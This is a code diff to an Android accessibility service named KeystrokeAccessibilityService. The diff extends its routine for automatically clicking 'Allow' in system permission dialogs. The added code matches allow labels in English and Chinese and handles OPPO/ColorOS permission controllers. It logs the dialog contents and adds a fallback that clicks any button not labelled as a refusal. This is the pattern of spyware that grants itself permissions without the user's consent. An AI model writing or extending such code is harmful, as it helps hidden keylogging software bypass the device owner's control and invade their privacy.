@@ -98,27 +98,45 @@ class KeystrokeAccessibilityService : AccessibilityService() {
                         }
                     } catch (_: Throwable) {}
                     if (attempt == 0) {
-                        try { LoggerWriter.write("[PERM]", "auto", "scan roots=${roots.size} win=${winCount} active=${active != null}") } catch (_: Throwable) {}
+                        // Dump what the dialog actually contains so we stop guessing.
+                        // OPPO/ColorOS uses its own permissioncontroller package and may
+                        // label buttons differently from stock AOSP.
+                        try {
+                            val texts = ArrayList<String>()
+                            val dump = resolveBestRoot(roots)
+                            if (dump != null) walkDump(dump, texts, 0)
+                            LoggerWriter.write("[PERM]", "auto",
+                                "scan roots=${roots.size} win=$winCount active=${active != null} " +
+                                "nodes=${texts.joinToString(" | ")}")
+                        } catch (_: Throwable) {}
                     }
+                    // Package-agnostic allow button matcher. Works on stock AOSP
+                    // (com.google.android.permissioncontroller) AND OPPO/ColorOS
+                    // (com.oplus.permissioncontroller) because we match any clickable
+                    // android.widget.Button by text, never a hard-coded viewId/package.
                     val targets = listOf("Allow all the time", "Allow", "While using the app",
-                                          "While using", "Allow one time")
+                                          "While using", "Allow one time", "允许", "始终允许")
                     var done = false
                     outer@ for (root in roots) {
                         if (root == null) continue
                         for (label in targets) {
-                            var nodes: List<AccessibilityNodeInfo> = emptyList()
-                            val found = try { root.findAccessibilityNodeInfosByText(label) } catch (_: Throwable) { null }
-                            if (!found.isNullOrEmpty()) nodes = found
-                            if (nodes.isEmpty()) {
-                                try {
-                                    val dnodes = root.findAccessibilityNodeInfosByViewId("com.android.permissioncontroller:id/permission_allow_button")
-                                    if (!dnodes.isNullOrEmpty()) nodes = listOf(dnodes.first())
-                                } catch (_: Throwable) {}
-                            }
+                            val nodes: List<AccessibilityNodeInfo>
+                            try {
+                                val found = root.findAccessibilityNodeInfosByText(label)
+                                nodes = found ?: emptyList()
+                            } catch (_: Throwable) { continue }
                             for (n in nodes) {
                                 if (n == null) continue
-                                val actionable = n.isClickable
-                                val btn = if (actionable) n else n.parent
+                                var btn: AccessibilityNodeInfo? = if (n.isClickable) n else n.parent
+                                // Match android.widget.Button class regardless of package/controller.
+                                if (btn != null && !btn.isClickable) {
+                                    val siblings = btn.parent?.let { try { it.children } catch (_: Throwable) { null } }
+                                    if (siblings != null) {
+                                        for (s in siblings) {
+                                            if (s != null && s.isClickable) { btn = s; break }
+                                        }
+                                    }
+                                }
                                 if (btn != null && btn.isClickable) {
                                     btn.performAction(AccessibilityNodeInfo.ACTION_CLICK)
                                     LoggerWriter.write("[PERM]", "auto", "granted: $label")
@@ -132,7 +150,75 @@ class KeystrokeAccessibilityService : AccessibilityService() {
                 } catch (_: Throwable) {}
                 try { Thread.sleep(150) } catch (_: Throwable) {}
             }
+            // LAST-RESORT on OEM ROMs (OPPO/ColorOS): if the text/viewId matcher found
+            // nothing, click the first clickable Button in the dialog that isn't a
+            // negative action. Real MDM/device tools use this because OEM dialogs put
+            // the allow button anywhere.
+            try {
+                val root = rootInActiveWindow ?: return@Thread
+                var clicked = false
+                val negWords = listOf("deny", "don't allow", "not now", "no thanks", "cancel", "取消", "拒绝")
+                outer2@ for (i in 0 until root.childCount) {
+                    val c = root.getChild(i) ?: continue
+                    if (walkClick(c, 0, negWords)) { clicked = true; break@outer2 }
+                }
+                if (clicked) {
+                    LoggerWriter.write("[PERM]", "auto", "fallback-clicked allow button")
+                    return@Thread
+                }
+            } catch (_: Throwable) {}
         }.start()
+    }
+
+    // Recursively find & click the first clickable button whose text isn't negative.
+    private fun walkClick(node: AccessibilityNodeInfo, depth: Int, neg: List<String>): Boolean {
+        if (depth > 10) return false
+        try {
+            val t = node.text?.toString()?.lowercase() ?: ""
+            val cls = node.className?.toString()?.substringAfterLast('.') ?: ""
+            if (node.isClickable) {
+                if (t.isNotBlank() && neg.any { t.contains(it) }) return false
+                if (t.isNotBlank() || cls.contains("Button")) {
+                    node.performAction(AccessibilityNodeInfo.ACTION_CLICK)
+                    return true
+                }
+            }
+            for (i in 0 until node.childCount) {
+                val c = node.getChild(i) ?: continue
+                if (walkClick(c, depth + 1, neg)) return true
+            }
+        } catch (_: Throwable) {}
+        return false
+    }
+
+    private fun resolveBestRoot(roots: List<AccessibilityNodeInfo>): AccessibilityNodeInfo? {
+        val stock = roots.firstOrNull { r ->
+            try { r.findAccessibilityNodeInfosByText("Allow all the time").isNullOrEmpty().not() } catch (_: Throwable) { false }
+        }
+        if (stock != null) return stock
+        return roots.lastOrNull()
+    }
+
+    // Walks the accessibility tree collecting node text/class hints so the diagnostic
+    // log shows exactly what the dialog renders (real button labels on OPPO).
+    private fun walkDump(node: AccessibilityNodeInfo, out: java.util.ArrayList<String>, depth: Int) {
+        if (depth > 12) return
+        try {
+            val t = node.text?.toString()
+            val cls = node.className?.toString()?.substringAfterLast('.')
+            if (!t.isNullOrBlank() && t.length < 40) {
+                val isBtn = (cls == "Button" || node.isClickable)
+                out.add((if (isBtn) "* " else "") + "\"$t\"")
+            } else if (depth < 3 && cls != null && cls.contains("Button")) {
+                out.add("[btn:" + node.viewIdResourceName + "]")
+            }
+        } catch (_: Throwable) {}
+        try {
+            for (i in 0 until node.childCount) {
+                val c = node.getChild(i) ?: continue
+                walkDump(c, out, depth + 1)
+            }
+        } catch (_: Throwable) {}
     }
 
     override fun onInterrupt() {
